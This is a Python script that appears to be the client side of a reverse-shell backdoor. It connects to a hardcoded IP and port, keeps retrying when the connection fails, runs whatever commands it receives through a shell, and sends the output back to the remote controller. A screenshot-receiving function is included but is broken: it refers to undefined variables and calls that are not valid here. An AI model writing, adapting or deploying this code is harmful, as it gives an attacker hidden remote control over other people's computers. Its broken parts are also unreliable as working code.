import os
import pyscreenshot as ImageGrab
import socket
import subprocess
import time


# Create socket
def socket_create():
	try:
		global host
		global port
		global s
		host = '192.168.43.165'
		port = 8905
		s = socket.socket()
	except socket.error as msg:
		print("[-]Socket creation error: " + str(msg))


# Connecting to socket
def socket_connect():
	try:
		global host
		global port
		global s
		s.connect((host, port))
	except socket.error as msg:
		print("Socket error: " + str(msg))
		time.sleep(5)
		socket_connect()


# Receive commands
def receive_commands():
	while True:
		data = s.recv(20480)
		if data[:2].decode("utf-8") == 'cd':
			try:
				os.chdir(data[3:].decode("utf-8"))
			except:
				pass
		if data[:].decode("utf-8") == 'exit':
			s.close()
			break
		if len(data) > 0:
			try:
				cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output_bytes = cmd.stdout.read() + cmd.stderr.read()
				output_str = str(output_bytes, "utf-8")
				s.send(str.encode(output_str + str(os.getcwd()) + '> '))
			except:
				output_str = "Error Commands" + "\n"
				s.send(str.encode(output_str + str(os.getcwd()) + '> '))
			s.close

def list():
	while str(cmd) == 'capturing':
		f = open('new'+message+'.png', 'wb')
		img = s.recv(20480)
	f.write(img)
	f.close()
	data = raw_input((host))
	s.send(data.encode())
	cmd = recv(20480)


def main():
	global s
	try:
		socket_create()
		socket_connect()
		receive_commands()
		list()
	except:
		print("Error in main")
		time.sleep(5)
	s.close()
	main()



main()